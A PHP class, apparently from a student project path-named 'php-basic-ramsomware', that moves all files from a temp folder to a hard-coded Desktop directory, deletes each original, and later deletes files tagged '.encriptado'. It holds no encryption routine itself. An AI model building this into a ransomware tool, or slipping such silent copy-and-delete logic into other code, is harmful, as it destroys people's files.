<?php
    
    class EmpacarZip {
        private string $newPath;
        private string $currentDirectory;

        public function __construct() {
            $this->newPath = "C:/Users/HP/Desktop/SDR404/";
            $this->currentDirectory = "C:/xampp/htdocs/php-basic-ramsomware-MauricioPerez/assets/tmp_files";
        }

        public function empacarDatos() {
            $directory = $this->currentDirectory;
            if(is_dir($directory)) {
                $gestor = opendir($directory);

                //Recorrer elementos de la carpeta
                /*if(!is_dir($directory . "archivos_desencriptados")) {
                    mkdir($directory . "archivos_desencriptados", 0777);
                    echo "carpeta creada";
                }*/
                    

                while(($archivo = readdir($gestor)) !== false) {
                    $ruta_completa = $directory . "/". $archivo;
                    if($archivo != "." && $archivo != "..") {
                      
                            echo $archivo;
                            //$subdirectory = $directory . "archivos_desencriptados/" . $archivo;
                            if(copy($ruta_completa, $this->newPath . "/". $archivo)) {
                                echo "Transferencia de archivos realizada con exito.";
                                unlink($ruta_completa);
                            }
                                
                            
                    }

                        
                }

                closedir($gestor);
            }
        }

        public function cleanSDR404() {
            $objectiveDirectory = $this->newPath;

            if(is_dir($objectiveDirectory)) {
                $gestor = opendir($objectiveDirectory);
                while(($archivo = readdir($gestor)) !== false) {
                    $ruta_completa = $objectiveDirectory . "/" . $archivo;
                    if($archivo != "." && $archivo != "..") {
                        if(strpos($archivo, ".encriptado") == true) {
                            unlink($ruta_completa);
                        }
                    }
                }
            }
        }


    }

    

?>